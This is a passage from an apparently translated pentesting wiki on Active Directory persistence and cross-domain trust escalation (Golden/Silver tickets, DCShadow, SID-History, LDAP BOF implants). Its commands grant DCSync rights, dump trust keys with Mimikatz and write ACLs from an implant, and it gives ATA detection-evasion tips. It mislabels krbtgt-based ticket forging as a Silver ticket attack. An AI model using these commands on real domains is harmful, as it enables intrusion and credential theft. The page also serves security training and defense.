- Einem Benutzer Berechtigungen für [**DCSync**](#dcsync) geben

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Der **Silver Ticket attack** erstellt ein **legitimes Ticket Granting Service (TGS)-Ticket** für einen bestimmten Dienst, indem der **NTLM hash** verwendet wird (zum Beispiel der **Hash des PC-Kontos**). Diese Methode wird verwendet, um auf die **Dienstberechtigungen** zuzugreifen.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Ein **Golden Ticket attack** beinhaltet, dass ein Angreifer Zugriff auf den **NTLM hash des krbtgt-Kontos** in einer Active Directory (AD)-Umgebung erlangt. Dieses Konto ist besonders, weil es zum Signieren aller **Ticket Granting Tickets (TGTs)** verwendet wird, die für die Authentifizierung innerhalb des AD-Netzwerks unerlässlich sind.

Sobald der Angreifer diesen Hash erhält, kann er **TGTs** für jedes beliebige Konto erstellen (**Silver ticket attack**).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese sind wie Golden Tickets, nur so gefälscht, dass sie **gängige Erkennungsmechanismen für Golden Tickets umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Zertifikate eines Kontos zu haben oder sie anfordern zu können** ist ein sehr guter Weg, um im Benutzerkonto zu persistieren (selbst wenn er das Passwort ändert):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Zertifikate zu verwenden ist auch möglich, um mit hohen Rechten innerhalb der Domain zu persistieren:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Das **AdminSDHolder**-Objekt in Active Directory stellt die Sicherheit von **privilegierten Gruppen** (wie Domain Admins und Enterprise Admins) sicher, indem es eine standardisierte **Access Control List (ACL)** auf diese Gruppen anwendet, um unautorisierte Änderungen zu verhindern. Diese Funktion kann jedoch missbraucht werden; wenn ein Angreifer die ACL von AdminSDHolder so ändert, dass ein normaler Benutzer Vollzugriff erhält, bekommt dieser Benutzer umfangreiche Kontrolle über alle privilegierten Gruppen. Diese Sicherheitsmaßnahme, die eigentlich schützen soll, kann also nach hinten losgehen und unberechtigten Zugriff ermöglichen, wenn sie nicht genau überwacht wird.

[**Mehr Informationen über die AdminDSHolder Group hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Innerhalb jedes **Domain Controller (DC)** existiert ein **lokales Administrator**-Konto. Wenn man auf einer solchen Maschine Admin-Rechte erlangt, kann der lokale Administrator-Hash mit **mimikatz** extrahiert werden. Danach ist eine Registry-Änderung notwendig, um **die Verwendung dieses Passworts zu aktivieren**, sodass ein Remote-Zugriff auf das lokale Administrator-Konto möglich wird.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Du könntest einem **Benutzer** über bestimmte Domain-Objekte einige **spezielle Berechtigungen** geben, die es dem Benutzer ermöglichen werden, in Zukunft **Rechte zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **Security Descriptors** werden verwendet, um die **Berechtigungen** zu **speichern**, die ein **Objekt** über ein **Objekt** hat. Wenn du nur **eine kleine Änderung** am **Security Descriptor** eines Objekts vornehmen kannst, kannst du sehr interessante Rechte über dieses Objekt erhalten, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Missbrauche die `dynamicObject`-Hilfsklasse, um kurzlebige Principals/GPOs/DNS-Einträge mit `entryTTL`/`msDS-Entry-Time-To-Die` zu erstellen; sie löschen sich selbst ohne Tombstones, wodurch LDAP-Spuren verschwinden, während verwaiste SIDs, kaputte `gPLink`-Referenzen oder gecachte DNS-Antworten zurückbleiben (z. B. AdminSDHolder-ACE-Verschmutzung oder bösartige `gPCFileSysPath`/AD-integrierte DNS-Umleitungen).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Ändere **LSASS** im Speicher, um ein **universelles Passwort** festzulegen, das Zugriff auf alle Domain-Konten gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Hier erfährst du, was ein SSP (Security Support Provider) ist.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst deinen **eigenen SSP** erstellen, um die für den Zugriff auf die Maschine verwendeten Credentials **im Klartext zu erfassen**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Es registriert einen **neuen Domain Controller** in AD und nutzt ihn, um **Attribute zu pushen** (SIDHistory, SPNs...) auf bestimmte Objekte **ohne** irgendwelche **Logs** über die **Änderungen** zu hinterlassen. Du **brauchst DA**-Rechte und musst dich in der **Root-Domain** befinden.\
Beachte, dass bei falschen Daten ziemlich hässliche Logs auftauchen werden.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Zuvor haben wir besprochen, wie man Rechte eskaliert, wenn man **ausreichend Berechtigung hat, um LAPS-Passwörter zu lesen**. Diese Passwörter können jedoch auch verwendet werden, um **Persistence aufrechtzuerhalten**.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft betrachtet den **Forest** als Sicherheitsgrenze. Das bedeutet, dass das **Kompromittieren einer einzelnen Domain potenziell zur Kompromittierung des gesamten Forest führen könnte**.

### Basic Information

Ein [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der es einem Benutzer aus einer **Domain** ermöglicht, auf Ressourcen in einer anderen **Domain** zuzugreifen. Er erstellt im Wesentlichen eine Verbindung zwischen den Authentifizierungssystemen der beiden Domains, sodass Authentifizierungsprüfungen nahtlos fließen können. Wenn Domains einen Trust einrichten, tauschen sie bestimmte **Keys** innerhalb ihrer **Domain Controller (DCs)** aus und behalten sie dort, was entscheidend für die Integrität des Trusts ist.

In einem typischen Szenario muss ein Benutzer, der auf einen Dienst in einer **trusted domain** zugreifen will, zuerst ein spezielles Ticket anfordern, das als **inter-realm TGT** vom DC seiner eigenen Domain. Dieses TGT wird mit einem gemeinsamen **key** verschlüsselt, auf den sich beide Domains geeinigt haben. Der Benutzer präsentiert dann dieses TGT dem **DC der trusted domain**, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Validierung des inter-realm TGT durch den DC der trusted domain stellt dieser ein TGS aus und gewährt dem Benutzer Zugriff auf den Dienst.

**Schritte**:

1. Ein **Client-Computer** in **Domain 1** startet den Prozess, indem er seinen **NTLM hash** verwendet, um ein **Ticket Granting Ticket (TGT)** von seinem **Domain Controller (DC1)** anzufordern.
2. DC1 stellt ein neues TGT aus, wenn der Client erfolgreich authentifiziert wurde.
3. Der Client fordert dann ein **inter-realm TGT** von DC1 an, das benötigt wird, um auf Ressourcen in **Domain 2** zuzugreifen.
4. Das inter-realm TGT wird mit einem **trust key** verschlüsselt, der zwischen DC1 und DC2 als Teil des zweiseitigen Domain Trusts geteilt wird.
5. Der Client bringt das inter-realm TGT zum **Domain Controller (DC2) von Domain 2**.
6. DC2 überprüft das inter-realm TGT mit seinem gemeinsamen trust key und stellt, wenn es gültig ist, ein **Ticket Granting Service (TGS)** für den Server in Domain 2 aus, auf den der Client zugreifen möchte.
7. Schließlich präsentiert der Client diesem Server dieses TGS, das mit dem Hash des Serverkontos verschlüsselt ist, um Zugriff auf den Dienst in Domain 2 zu erhalten.

### Different trusts

Es ist wichtig zu beachten, dass **ein Trust ein- oder zweiseitig sein kann**. Bei zweiseitigen Optionen vertrauen beide Domains einander, aber bei einer **einseitigen** Trust-Beziehung ist eine der Domains die **trusted** und die andere die **trusting** Domain. Im letzten Fall kannst du **nur von der trusted Domain aus auf Ressourcen innerhalb der trusting Domain zugreifen**.

Wenn Domain A Domain B vertraut, ist A die trusting Domain und B die trusted Domain. Außerdem wäre dies in **Domain A** ein **Outbound trust**; und in **Domain B** ein **Inbound trust**.

**Verschiedene Trust-Beziehungen**

- **Parent-Child Trusts**: Dies ist ein gängiges Setup innerhalb desselben Forest, bei dem eine Child Domain automatisch einen zweiseitigen transitive Trust mit ihrer Parent Domain hat. Im Wesentlichen bedeutet das, dass Authentifizierungsanfragen nahtlos zwischen Parent und Child fließen können.
- **Cross-link Trusts**: Auch als "shortcut trusts" bezeichnet, werden sie zwischen Child Domains eingerichtet, um Referral-Prozesse zu beschleunigen. In komplexen Forests müssen Authentifizierungs-Referrals typischerweise zum Forest Root und dann wieder hinunter zur Ziel-Domain laufen. Durch Cross-links wird der Weg verkürzt, was besonders in geografisch verteilten Umgebungen nützlich ist.
- **External Trusts**: Diese werden zwischen verschiedenen, nicht verwandten Domains eingerichtet und sind naturgemäß nicht transitiv. Laut [Microsofts Dokumentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind External Trusts nützlich, um auf Ressourcen in einer Domain außerhalb des aktuellen Forest zuzugreifen, die nicht durch einen Forest Trust verbunden ist. Die Sicherheit wird durch SID-Filtering bei External Trusts erhöht.
- **Tree-root Trusts**: Diese Trusts werden automatisch zwischen der Forest-Root-Domain und einer neu hinzugefügten Tree Root eingerichtet. Auch wenn sie nicht häufig vorkommen, sind Tree-root Trusts wichtig, um neue Domain Trees zu einem Forest hinzuzufügen, ihnen einen eindeutigen Domain-Namen zu ermöglichen und die zweiseitige Transitivität sicherzustellen. Mehr Informationen finden sich in [Microsofts Leitfaden](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Diese Art von Trust ist ein zweiseitiger transitive Trust zwischen zwei Forest-Root-Domains und erzwingt ebenfalls SID-Filtering zur Erhöhung der Sicherheit.
- **MIT Trusts**: Diese Trusts werden mit nicht-Windows-[RFC4120-konformen](https://tools.ietf.org/html/rfc4120) Kerberos-Domains eingerichtet. MIT Trusts sind etwas spezieller und richten sich an Umgebungen, die eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems benötigen.

#### Other differences in **trusting relationships**

- Eine Trust-Beziehung kann auch **transitiv** sein (A vertraut B, B vertraut C, also vertraut A C) oder **nicht transitiv**.
- Eine Trust-Beziehung kann als **bidirectional trust** (beide vertrauen einander) oder als **one-way trust** (nur einer vertraut dem anderen) eingerichtet werden.

### Attack Path

1. Die Trust-Beziehungen **enumerieren**
2. Prüfen, ob irgendein **Security Principal** (Benutzer/Gruppe/Computer) **Zugriff** auf Ressourcen der **anderen Domain** hat, vielleicht über ACE-Einträge oder indem er Mitglied in Gruppen der anderen Domain ist. Suche nach **Beziehungen über Domains hinweg** (dafür wurde der Trust wahrscheinlich erstellt).
1. kerberoast könnte in diesem Fall eine weitere Option sein.
3. Die **Konten kompromittieren**, die ein **Pivoting** zwischen Domains ermöglichen.

Angreifer mit Zugriff auf Ressourcen in einer anderen Domain können dies über drei Hauptmechanismen tun:

- **Local Group Membership**: Principals können lokalen Gruppen auf Maschinen hinzugefügt werden, z. B. der Gruppe „Administrators“ auf einem Server, wodurch sie erhebliche Kontrolle über diese Maschine erhalten.
- **Foreign Domain Group Membership**: Principals können auch Mitglieder von Gruppen innerhalb der fremden Domain sein. Die Wirksamkeit dieser Methode hängt jedoch von der Art des Trusts und dem Umfang der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals können in einer **ACL** angegeben sein, insbesondere als Entitäten in **ACEs** innerhalb einer **DACL**, wodurch sie Zugriff auf bestimmte Ressourcen erhalten. Für alle, die tiefer in die Mechanik von ACLs, DACLs und ACEs einsteigen möchten, ist das Whitepaper mit dem Titel “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” eine unschätzbare Ressource.

### Find external users/groups with permissions

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** prüfen, um fremde Security Principals in der Domain zu finden. Das werden Benutzer/Gruppen aus **einer externen Domain/Forest** sein.

Du könntest dies in **Bloodhound** oder mit powerview prüfen:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Privilege Escalation von Child zu Parent Forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Andere Möglichkeiten, Domain Trusts zu enumerieren:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Es gibt **2 trusted keys**, eine für _Child --> Parent_ und eine weitere für _Parent_ --> _Child_.\
> Du kannst die vom aktuellen domain verwendete mit:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escaliere als Enterprise admin zum Child/Parent domain, indem du die trust mit SID-History injection missbrauchst:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Das Verständnis dafür, wie der Configuration Naming Context (NC) ausgenutzt werden kann, ist entscheidend. Der Configuration NC dient als zentrales Repository für Konfigurationsdaten in allen Active Directory (AD)-Umgebungen einer forest. Diese Daten werden auf jeden Domain Controller (DC) innerhalb der forest repliziert, wobei beschreibbare DCs eine beschreibbare Kopie des Configuration NC behalten. Um dies auszunutzen, muss man **SYSTEM privileges auf einem DC** haben, vorzugsweise auf einem Child DC.

**Link GPO to root DC site**

Der Sites-Container des Configuration NC enthält Informationen über die Sites aller Computer, die der domain beigetreten sind, innerhalb der AD forest. Wenn man mit SYSTEM privileges auf einem beliebigen DC arbeitet, können Angreifer GPOs an die root DC sites verlinken. Diese Aktion kann die root domain potenziell kompromittieren, indem Policies manipuliert werden, die auf diese sites angewendet werden.

Für ausführliche Informationen kann man Research zu [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) ansehen.

**Compromise any gMSA in the forest**

Ein Angriffspfad besteht darin, privilegierte gMSAs innerhalb der domain anzugreifen. Der KDS Root key, der für die Berechnung der Passwörter von gMSAs essenziell ist, wird im Configuration NC gespeichert. Mit SYSTEM privileges auf einem beliebigen DC ist es möglich, auf den KDS Root key zuzugreifen und die Passwörter für jede gMSA in der gesamten forest zu berechnen.

Detaillierte Analyse und Schritt-für-Schritt-Anleitung finden sich in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ergänzender delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Zusätzliche externe Research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Diese Methode erfordert Geduld und das Warten auf die Erstellung neuer privilegierter AD objects. Mit SYSTEM privileges kann ein Angreifer das AD Schema ändern, um jedem Benutzer vollständige Kontrolle über alle classes zu geben. Dies könnte zu unbefugtem Zugriff und Kontrolle über neu erstellte AD objects führen.

Weiterführende Informationen gibt es unter [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5 vulnerability zielt auf die Kontrolle über Public Key Infrastructure (PKI)-Objekte ab, um ein certificate template zu erstellen, das Authentifizierung als jeder beliebige user innerhalb der forest ermöglicht. Da sich PKI-Objekte im Configuration NC befinden, ermöglicht die Kompromittierung eines beschreibbaren Child DC die Ausführung von ESC5 attacks.

Mehr Details dazu stehen in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In Szenarien ohne ADCS hat der attacker die Möglichkeit, die notwendigen Komponenten einzurichten, wie in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In diesem Szenario **ist Ihre Domain vertrauenswürdig** von einer externen Domain, die Ihnen **nicht näher bestimmte Berechtigungen** darüber gewährt. Sie müssen herausfinden, **welche Principals Ihrer Domain welchen Zugriff auf die externe Domain haben** und dann versuchen, dies auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest-Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In diesem Szenario **vertraut deine Domäne** einem Principal aus **anderen Domänen** **Berechtigungen**.

Wenn jedoch eine **Domäne von der vertrauenden Domäne vertraut** wird, erstellt die vertrauende Domäne einen **Benutzer** mit einem **vorhersehbaren Namen**, der als **Passwort das trusted password** verwendet. Das bedeutet, dass es möglich ist, auf einen Benutzer aus der vertrauenden Domäne zuzugreifen, um in die vertrauenswürdige Domäne zu gelangen, sie zu enumerieren und zu versuchen, weitere Privilegien zu eskalieren:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine weitere Möglichkeit, die vertrauenswürdige Domäne zu kompromittieren, besteht darin, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in der **entgegengesetzten Richtung** der Domänenvertrauenskette erstellt wurde (was nicht sehr häufig vorkommt).

Eine weitere Möglichkeit, die vertrauenswürdige Domäne zu kompromittieren, besteht darin, auf einer Maschine zu warten, auf die sich ein **Benutzer aus der vertrauenswürdigen Domäne einloggen kann** via **RDP**. Dann könnte der Angreifer Code in den RDP-Session-Prozess injizieren und von dort aus auf die **Ursprungsdomäne des Opfers** zugreifen.\
Außerdem könnte der Angreifer, wenn das **Opfer seine Festplatte gemountet hat**, aus dem **RDP-Session**-Prozess heraus **Backdoors** im **Startup-Ordner der Festplatte** ablegen. Diese Technik heißt **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigation von Domain Trust Abuse

### **SID Filtering:**

- Das Risiko von Angriffen, die das Attribut SID history über Forest Trusts hinweg ausnutzen, wird durch SID Filtering gemindert, das standardmäßig bei allen inter-forest trusts aktiviert ist. Dies basiert auf der Annahme, dass intra-forest trusts sicher sind, wobei der Forest und nicht die Domäne gemäß der Haltung von Microsoft als Sicherheitsgrenze betrachtet wird.
- Es gibt jedoch einen Haken: SID filtering kann Anwendungen und den Benutzerzugriff stören, weshalb es gelegentlich deaktiviert wird.

### **Selective Authentication:**

- Bei inter-forest trusts stellt Selective Authentication sicher, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen sind explizite Berechtigungen erforderlich, damit Benutzer auf Domänen und Server innerhalb der vertrauenden Domäne oder des Forests zugreifen können.
- Wichtig ist, dass diese Maßnahmen nicht vor der Ausnutzung des writable Configuration Naming Context (NC) oder vor Angriffen auf das trust account schützen.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-ähnliche LDAP-Primitives als x64 Beacon Object Files neu, die vollständig داخل eines on-host implant (z. B. Adaptix C2) ausgeführt werden. Operatoren kompilieren das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen dann `ldap <subcommand>` aus dem beacon auf. Der gesamte Traffic läuft über den aktuellen logon security context via LDAP (389) mit signing/sealing oder LDAPS (636) mit auto certificate trust, sodass keine socks proxies oder disk artifacts erforderlich sind.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, und `get-groupmembers` lösen Kurznamen/OU-Pfade in vollständige DNs auf und geben die entsprechenden Objekte aus.
- `get-object`, `get-attribute`, und `get-domaininfo` ziehen beliebige Attribute (einschließlich security descriptors) sowie die Forest-/Domain-Metadaten aus `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, und `get-rbcd` zeigen direkt aus LDAP roasting candidates, delegation settings und vorhandene [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-Deskriptoren an.
- `get-acl` und `get-writable --detailed` parsen die DACL, um trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) und inheritance aufzulisten, und liefern so sofortige Ziele für ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ermöglichen es dem Operator, neue Principals oder Machine Accounts dort zu platzieren, wo OU-Rechte vorhanden sind. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` übernehmen Targets direkt, sobald Write-Property-Rechte gefunden wurden.
- ACL-fokussierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` übersetzen WriteDACL/WriteOwner auf jedem AD-Objekt in Passwort-Resets, Kontrolle über Gruppenmitgliedschaften oder DCSync-Replikationsrechte, ohne PowerShell/ADSI-Artefakte zu hinterlassen. `remove-*` Gegenstücke räumen injizierte ACEs wieder auf.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort Kerberoastable; `add-asreproastable` (UAC-Schalter) markiert ihn für AS-REP roasting, ohne das Passwort anzutasten.
- Delegation-Makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) schreiben `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` direkt vom Beacon aus um, ermöglichen constrained/unconstrained/RBCD-Angriffswege und machen remote PowerShell oder RSAT überflüssig.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten Principals (siehe [SID-History Injection](sid-history-injection.md)) und liefert so verdeckten geerbten Zugriff vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/OU von Computern oder Benutzern und erlaubt es einem Angreifer, Assets in OUs zu verschieben, in denen delegierte Rechte bereits existieren, bevor `set-password`, `add-groupmember` oder `add-spn` missbraucht werden.
- Eng begrenzte Löschbefehle (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, usw.) erlauben nach dem Einsammeln von Credentials oder Persistence ein schnelles Rollback und minimieren so die Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Es wird empfohlen, dass Domain Admins sich nur auf Domain Controllern anmelden dürfen und ihre Nutzung auf anderen Hosts vermieden wird.
- **Service Account Privileges**: Services sollten nicht mit Domain Admin (DA)-Rechten ausgeführt werden, um die Sicherheit zu erhalten.
- **Temporal Privilege Limitation**: Für Aufgaben, die DA-Rechte erfordern, sollte deren Dauer begrenzt werden. Dies kann erreicht werden durch: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 und erzwinge dann LDAP signing plus LDAPS channel binding auf DCs/Clients, um LDAP MITM/relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Wenn du gängige AD-Tradecraft erkennen willst, verlasse dich **nicht nur auf vom Operator kontrollierte Artefakte** wie umbenannte Binaries, Service-Namen, temporäre Batch-Dateien oder Ausgabepfade. Erfasse das Verhalten, mit dem legitime Windows-Clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC und WMI-Traffic aufbauen, und suche dann nach **Implementierungsbesonderheiten**, die auch dann bleiben, wenn der Operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` oder `ntlmrelayx.py` anpasst.

- **High-confidence standalone candidates** (nach Validierung gegen dein eigenes Baseline):
- Authenticated DCE/RPC using `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding filled with `0xff`
- LDAP Kerberos binds that place a raw Kerberos `AP-REQ` directly in SPNEGO `mechToken`
- SMB2/3 negotiate requests with ASCII-looking `ClientGuid` values
- WMI `IWbemLevel1Login::NTLMLogin` using the non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Better as correlation/scoring features**:
- Sparse or duplicated Kerberos etype lists, unusual/missing `PA-DATA`, or TGS-REQ etype ordering that differs from native Windows
- NTLM Type 1 messages missing version info or Type 3 messages with null host names
- Raw NTLMSSP carried in DCE/RPC instead of SPNEGO, missing DCE/RPC verification trailers, or SPNEGO/Kerberos OID mismatches
- Several of these traits from the same host/user/session/time window are far stronger than any single weak field
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, and tool-specific HTTP/WebDAV/RDP/MSSQL strings
- These are easy for operators to change and are best used to explain why a cross-protocol cluster is suspicious
- **Operational notes**:
- Some of these signals require decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, or service-side visibility
- Validate against Samba/Linux clients, appliances, and legacy software before promoting to alerts
- Promote detections from enrichment -> hunting -> alerting as you build confidence in the baseline

### **Implementing Deception Techniques**

- Implementing deception involves setting traps, like decoy users or computers, with features such as passwords that do not expire or are marked as Trusted for Delegation. A detailed approach includes creating users with specific rights or adding them to high privilege groups.
- A practical example involves using tools like: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- More on deploying deception techniques can be found at [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Verdächtige Indikatoren sind atypische ObjectSID, seltene Logons, Erstellungsdaten und niedrige Bad-Password-Counts.
- **General Indicators**: Der Vergleich von Attributen potenzieller Decoy-Objekte mit denen echter Objekte kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können helfen, solche Täuschungen zu erkennen.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Das Vermeiden von Session-Enumeration auf Domain Controllern verhindert die ATA-Erkennung.
- **Ticket Impersonation**: Die Nutzung von **aes**-Keys für die Ticket-Erstellung hilft, Erkennung zu umgehen, indem nicht auf NTLM heruntergestuft wird.
- **DCSync Attacks**: Es wird empfohlen, von einem Nicht-Domain-Controller aus auszuführen, um ATA-Erkennung zu vermeiden, da die direkte Ausführung von einem Domain Controller Alarme auslöst.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
